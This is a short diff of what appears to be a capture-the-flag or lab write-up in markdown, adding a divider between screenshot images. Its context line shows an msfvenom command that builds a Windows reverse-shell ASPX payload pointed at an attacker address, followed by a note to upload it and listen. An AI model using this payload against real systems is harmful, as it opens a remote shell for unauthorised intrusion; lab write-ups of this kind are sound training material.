@@ -48,7 +48,9 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sli
 
 # After that upload to the web interface and listen it
 
-<img width="1097" height="291" alt="image" src="https://github.com/user-attachments/assets/9b2e6f76-713f-44ed-8321-4c1cd0b272ea" />
+<img width="1097" height="291" alt="image" src="https://github.com/user-attachments/assets/9b2e6f76-713f-44ed-8321-4c1cd0b272ea" /> 
+
+---
 
 <img width="911" height="442" alt="image" src="https://github.com/user-attachments/assets/975f003a-9233-4c64-9ed9-f647eda8b8f4" />
 
